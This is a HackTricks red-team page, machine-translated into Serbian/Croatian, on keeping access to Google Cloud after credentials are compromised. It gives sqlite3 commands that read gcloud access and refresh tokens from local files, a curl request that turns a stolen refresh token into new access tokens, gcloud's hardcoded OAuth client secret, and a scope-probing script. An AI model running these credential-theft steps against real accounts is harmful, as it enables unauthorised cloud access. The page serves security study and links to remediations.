# GCP - Non-svc Persistance

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 游눫 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

Ovo su korisne tehnike kada ste, na neki na캜in, kompromitovali neke GCP kredencijale ili ma코inu koja radi u GCP okru쬰nju.

## Token Hijacking

### Authenticated User Tokens

Da biste dobili **trenutni token** korisnika, mo쬰te pokrenuti:

{% code overflow="wrap" %}
```bash
sqlite3 $HOME/.config/gcloud/access_tokens.db "select access_token from access_tokens where account_id='<email>';"
```
{% endcode %}

Pogledajte na ovoj stranici kako **direktno koristiti ovaj token koriste캖i gcloud**:

{% embed url="https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf#id-6440-1" %}

Da biste dobili detalje za **generisanje novog pristupnog tokena** pokrenite:

{% code overflow="wrap" %}
```bash
sqlite3 $HOME/.config/gcloud/credentials.db "select value from credentials where account_id='<email>';"
```
{% endcode %}

Mogu캖e je prona캖i refresh tokens u **`$HOME/.config/gcloud/application_default_credentials.json`** i u **`$HOME/.config/gcloud/legacy_credentials/*/adc.json`**.

Da biste dobili novi osve쬰ni access token sa **refresh token**, client ID, i client secret pokrenite:

{% code overflow="wrap" %}
```bash
curl -s --data client_id=<client_id> --data client_secret=<client_secret> --data grant_type=refresh_token --data refresh_token=<refresh_token> --data scope="https://www.googleapis.com/auth/cloud-platform https://www.googleapis.com/auth/accounts.reauth" https://www.googleapis.com/oauth2/v4/token
```
{% endcode %}

Validnost refresh tokena mo쬰 se upravljati u **Admin** > **Security** > **Google Cloud session control**, i po defaultu je postavljena na 16h, iako mo쬰 biti postavljena da nikada ne istekne:

<figure><img src="../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

### Auth flow

Tok autentifikacije kada se koristi ne코to poput `gcloud auth login` 캖e otvoriti prompt u pretra쬴va캜u i nakon prihvatanja svih opsega pretra쬴va캜 캖e poslati zahtev kao 코to je ovaj na http port otvoren od strane alata:
```
/?state=EN5AK1GxwrEKgKog9ANBm0qDwWByYO&code=4/0AeaYSHCllDzZCAt2IlNWjMHqr4XKOuNuhOL-TM541gv-F6WOUsbwXiUgMYvo4Fg0NGzV9A&scope=email%20openid%20https://www.googleapis.com/auth/userinfo.email%20https://www.googleapis.com/auth/cloud-platform%20https://www.googleapis.com/auth/appengine.admin%20https://www.googleapis.com/auth/sqlservice.login%20https://www.googleapis.com/auth/compute%20https://www.googleapis.com/auth/accounts.reauth&authuser=0&prompt=consent HTTP/1.1
```
Then, gcloud 캖e koristiti stanje i kod sa nekim hardkodovanim `client_id` (`32555940559.apps.googleusercontent.com`) i **`client_secret`** (`ZmssLNjJy2998hD4CTg2ejr2`) da dobije **finalne podatke o refresh token-u**.

{% hint style="danger" %}
Napomena da je komunikacija sa localhost-om u HTTP-u, tako da je mogu캖e presresti podatke da bi se dobio refresh token, me캠utim, ovi podaci su validni samo jednom, tako da bi to bilo beskorisno, lak코e je samo pro캜itati refresh token iz fajla.
{% endhint %}

### OAuth Scopes

Mo쬰te prona캖i sve Google scope-ove na [https://developers.google.com/identity/protocols/oauth2/scopes](https://developers.google.com/identity/protocols/oauth2/scopes) ili ih dobiti izvr코avanjem:

{% code overflow="wrap" %}
```bash
curl "https://developers.google.com/identity/protocols/oauth2/scopes" | grep -oE 'https://www.googleapis.com/auth/[a-zA-A/\-\._]*' | sort -u
```
{% endcode %}

Mogu캖e je videti koje opsege aplikacija koju **`gcloud`** koristi za autentifikaciju mo쬰 podr쬬ti pomo캖u ovog skripta:
```bash
curl "https://developers.google.com/identity/protocols/oauth2/scopes" | grep -oE 'https://www.googleapis.com/auth/[a-zA-Z/\._\-]*' | sort -u | while read -r scope; do
echo -ne "Testing $scope         \r"
if ! curl -v "https://accounts.google.com/o/oauth2/auth?response_type=code&client_id=32555940559.apps.googleusercontent.com&redirect_uri=http%3A%2F%2Flocalhost%3A8085%2F&scope=openid+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fuserinfo.email+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fcloud-platform+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fappengine.admin+$scope+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fsqlservice.login+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fcompute+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Faccounts.reauth&state=AjvFqBW5XNIw3VADagy5pvUSPraLQu&access_type=offline&code_challenge=IOk5F08WLn5xYPGRAHP9CTGHbLFDUElsP551ni2leN4&code_challenge_method=S256" 2>&1 | grep -q "error"; then
echo ""
echo $scope
fi
done
```
Nakon izvr코avanja, provereno je da ova aplikacija podr쬬va ove opsege:
```
https://www.googleapis.com/auth/appengine.admin
https://www.googleapis.com/auth/bigquery
https://www.googleapis.com/auth/cloud-platform
https://www.googleapis.com/auth/compute
https://www.googleapis.com/auth/devstorage.full_control
https://www.googleapis.com/auth/drive
https://www.googleapis.com/auth/userinfo.email
```
interesantno je videti kako ova aplikacija podr쬬va **`drive`** opseg, 코to bi moglo omogu캖iti korisniku da eskalira sa GCP na Workspace ako napada캜 uspe da natera korisnika da generi코e token sa ovim opsegom.

**Pogledajte kako da** [**zloupotrebite ovo ovde**](../gcp-to-workspace-pivoting/#abusing-gcloud)**.**

### Service Accounts

Ba코 kao i sa autentifikovanim korisnicima, ako uspete da **kompromitujete privatni klju캜 fajl** servisa naloga, mo캖i 캖ete da mu **pristupate obi캜no koliko god 쬰lite**.\
Me캠utim, ako ukradete **OAuth token** servisa naloga, to mo쬰 biti jo코 zanimljivije, jer, 캜ak i ako su po defaultu ovi tokeni korisni samo sat vremena, ako **rtva obri코e privatni api klju캜, OAuth token 캖e i dalje biti va쬰캖i dok ne istekne**.

### Metadata

O캜igledno, dokle god ste unutar ma코ine koja radi u GCP okru쬰nju, mo캖i 캖ete da **pristupite servisu naloga pridru쬰nom toj ma코ini kontaktiraju캖i metadata endpoint** (imajte na umu da su OAuth tokeni kojima mo쬰te pristupiti na ovom endpoint-u obi캜no ograni캜eni opsegom).

### Remediations

Neke remedijacije za ove tehnike su obja코njene na [https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-2](https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-2)

## References

* [https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-1](https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-1)
* [https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-2](https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-2)

{% hint style="success" %}
Nau캜ite i ve쬭ajte AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Nau캜ite i ve쬭ajte GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podr쬴te HackTricks</summary>

* Pogledajte [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitter-u** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Delite hakovanje trikove podno코enjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
